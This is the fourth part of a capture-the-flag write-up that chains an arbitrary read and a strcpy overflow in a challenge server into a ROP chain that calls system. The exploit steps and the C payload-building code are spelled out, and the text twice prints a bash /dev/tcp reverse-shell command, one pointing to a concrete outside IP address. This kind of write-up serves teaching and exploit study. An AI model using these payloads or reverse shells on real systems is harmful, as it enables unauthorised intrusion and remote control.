title: T19 Challenge (Part 4)
---

[Last time][part3], we managed to empty the virus database, and got the third flag. But that's not enough. How about trying to get a shell?

### Recap
Previously, we managed to obtain an arbitrary read primitive, and a constrained write primitive.

##### Write
We can overflow `dest` to overwrite `index` (offset from `db` to read from) and `copy_buf` (target to write to). However, the new value of `index` must not contain null bytes since it will stop `strcpy` from copying further to overwrite `copy_buf`.

```c
int check_hash(char* input, char* buf)
{
  char dest[32];
  int index;
  char* copy_buf;

  init_db();

  index = 0;
  copy_buf = buf;
  strcpy(&dest, input);
  do
  {
    strcpy(copy_buf & 0xFFFFFFFFFFFFFFF0, &db[index]);
    if (!memcmp(&dest, copy_buf, 0x20))
      return 1;
    index += 0x21;
  }
  while (db[index]);
  return 0;
}
```

##### Read
Since `1117984489315730401 * 0x21 = 1` for qword multiplication, we can set `index = 1117984489315730401 * offset` to choose the offset from `db` to read from. This is better than only being able to read from offsets in multiples of `0x21`.

```c
char *get_hash(unsigned long long index)
{
  return &db[0x21 * index];
}
```

### The plan
In order to get a shell, we need a way to control `rip`. The best way here would be to place a ROP chain in the stack.

The steps we need to take could be summarized below:

##### 1. Locate the stack
We need to locate the stack so that we can overwrite the return address. In addition, we also want the address of the `message` received from the client, so that we can control what is being written.

##### 2. Overwrite `db` with a working address
The current location `db` is pointing to is no good. Because the stack is located at a higher address relative to `db`, the new value to overwrite `index` will contain null bytes, and stop `strcpy` from copying further to overwrite `copy_buf`.

A random address such as `0x1122334455667788` will be fine, since in this case, the offset for an address in the stack (e.g. `0x7fffffffeab8`) would definitely require 8 bytes to represent.

##### 3. Placing a ROP chain in the stack
Once we have all the above done, we are left with writing a ROP chain onto the stack. 

Sadly, we cannot use `one_gadget` here, because remember that we are not using `stdin` or `stdout`, but a separate `fd` to communicate with the server. `one_gadget` would just spawn a shell to talk with `stdin`/`stdout` but that's useless.

However, we can write a command to somewhere in memory, i.e. spawning a reverse shell with `"bash -i >& /dev/tcp/<ip>/8000 0>&1"`. Then, our ROP chain can call `system` with the address of that string as its argument.

### Exploit
##### Finding the stack
There exists addresses in the `ld` section that points to the stack, which we can easily find using gef.

![scan][scan-ld-stack-screenshot]

Since these addresses reside below our current stack frame, we can place a distinguishable value in our `message` (e.g. `0xdeadbeefcafebabe`), then read from the stack upwards until we find this value. 

From this we can compute the location of our return address to overwrite, as well as the `message` received from the client to copy from.

##### Finding libc
Since we will be calling `system` afterwards, we also need to find the address of libc. For doing this, it is more effective to use the same libc as the challenge server. So I downloaded `/lib/x86_64-linux-gnu/libc-2.24.so` from the challenge server, and from that time onwards spawn `srv_copy` with

```bash
LD_PRELOAD=./libc-2.24.so ./ld-2.24.so ./srv_copy
```

![scan][scan-ld-libc-screenshot]

Similar to finding the stack, we can utilize the references to libc present in the ld section. For example, we can read the address of `malloc` then subtract `0x7af10` to obtain the address of the start of `libc`.

##### Overwrite `db`
There is no strong restriction of what to overwrite the address that `db` points to with, but the most convenient way is to fill up all the 8 bytes, so that the offset of the stack relative to this address would take up 8 bytes.

For example, we set `db` to now be at `0x19edc3284c8b80b1`, so that when trying to copy from our `message` (at `0x7fffffffe8e0`), the `index` will be `0xe612bcd7b374682f`. No null bytes. 

Hence, our payload for `check_hash` would look something like the following

```
<32 byte padding> | <offset to memory containing new db> - 8 | 0x603108 (location of db)
```

Recall that the program will keep copying from `db[index]` until either 32 bytes from `dest` and `copy_buf` are the same, or `db[index]` contains a null byte. Also, there is `copy_buf & 0xFFFFFFFFFFFFFFF0` when calling `strcpy`, so offsets need to be adjusted accordingly.

```c
do
{
  strcpy(copy_buf & 0xFFFFFFFFFFFFFFF0, &db[index]);
  if (!memcmp(&dest, copy_buf, 0x20))
    return 1;
  index += 0x21;
}
while (db[index]);
```

It is almost certainly impossible to ensure that `db[index]` contains a null byte after changing the value of `db`, considering that both `index` and the new value of `db` are randomly chosen.

But we still need to stop the loop. We can achieve that by filling the 32 bytes of `dest` with the 32 bytes that are expected to be in `copy_buf`, so that `memcmp` returns 0 and we exit the loop.

With this in place, what we have achieved is the ability to **copy data from our sent message** into **anywhere we want**.

##### Placing the ROP chain
This part should be fairly simple with all the preparations made above. 

But first, we got to copy our command into somewhere in memory so that we can call `system` with it later. We choose to spawn a reverse shell due to the reasons discussed earlier.

```
bash -c "bash -i >& /dev/tcp/188.166.219.74/8080 0>&1"
```

One nice place is the original `db`, since it is not going to be used anywhere anymore, and we have one whole page of memory to work with. 

Finally, we can write our ROP chain onto the stack, like the following

```
pop rdi, ret
original_db
system()
```

Writing the ROP chain is slightly tricky because there will definitely be null bytes in our gadgets that will prevent `strcpy` from copying the whole chain at once. There is no way to avoid that, but we can take advantage of the loop in `check_hash` to keep copying until `dest == copy_buf`.

We can write the chain part by part, starting from the bottom, something like the following

```c
// includes rbp because location of return address ends with 8
// copy_buf & 0xFFFFFFFFFFFFFFF0 would result in the copying being done
// 8 bytes earlier

int i = 0;
*(unsigned long long*)&s.data[pad + 33 * i] = 0xdeadbeefcafebabe;       // rbp
*(unsigned long long*)&s.data[pad + 8 + 33 * i] = 0xdeadbeefcafebabe;   // ret_addr
*(unsigned long long*)&s.data[pad + 16 + 33 * i] = 0xdeadbeefcafebabe;  // ret_addr + 8
*(unsigned long long*)&s.data[pad + 24 + 33 * i] = system_addr;         // ret_addr + 16

i++;
*(unsigned long long*)&s.data[pad + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[pad + 8 + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[pad + 16 + 33 * i] = 0x00adbeefcafebabe;

i++;
*(unsigned long long*)&s.data[pad + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[pad + 8 + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[pad + 16 + 33 * i] = shell_str;

i++;
*(unsigned long long*)&s.data[pad + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[pad + 8 + 33 * i] = 0x00adbeefcafebabe;

i++;
*(unsigned long long*)&s.data[padding_len + 33 * i] = 0xdeadbeefcafebabe;
*(unsigned long long*)&s.data[padding_len + 8 + 33 * i] = pop_rdi_ret_gadget;
```

##### Exploit in action
If nothing goes wrong, we shall get a `root` shell.
